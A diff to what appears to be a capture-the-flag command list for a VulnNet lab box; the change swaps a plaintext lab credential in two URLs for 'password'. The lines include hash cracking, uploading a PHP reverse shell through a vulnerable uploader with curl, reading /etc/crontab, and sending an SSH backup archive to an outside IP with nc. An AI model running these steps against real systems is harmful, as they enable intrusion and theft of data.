@@ -6,8 +6,8 @@
 6 - john hash -w=/usr/share/wordlists/rockyou.txt
 7 - http://broadcast.vulnnet.thm
 8 - searchsploit -m 44250
-9 - curl -F "file=@php-reverse-shell.php" -F "plupload=1" -F "name=php-reverse-shell.php" "http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/beats_uploader.php"
-10 - http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1681653024e8ef69.php
+9 - curl -F "file=@php-reverse-shell.php" -F "plupload=1" -F "name=php-reverse-shell.php" "http://developers:password@broadcast.vulnnet.thm/actions/beats_uploader.php"
+10 - http://developers:password@broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1681653024e8ef69.php
 11 - cat /etc/crontab
 12 - ls /var/backups
 13 - nc 10.8.94.51 4445 < ssh-backup.tar.gz
